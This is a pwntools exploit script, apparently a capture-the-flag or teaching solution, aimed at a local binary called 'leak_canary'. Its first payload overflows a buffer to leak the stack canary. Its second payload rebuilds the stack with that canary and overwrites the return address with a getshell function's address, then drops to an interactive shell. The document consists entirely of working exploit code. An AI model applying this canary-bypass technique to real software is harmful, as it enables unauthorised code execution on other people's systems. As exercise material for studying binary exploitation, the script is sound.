from pwn import *
p = process("./leak_canary")
padding = 0x70 - 0xC
payload1 = "a"*padding + "s"
getshell_addr = 0x0804859B
context.log_level = "debug"
gdb.attach(p,"b *0x08048623")
p.send(payload1)
p.recvuntil("as")
canary = u32("\x00" + p.recv(3))
log.success("canary:"+hex(canary))
payload2 = "a"*padding + p32(canary) + "a"*0x8 + "junk" + p32(getshell_addr)
p.send(payload2)
p.interactive()

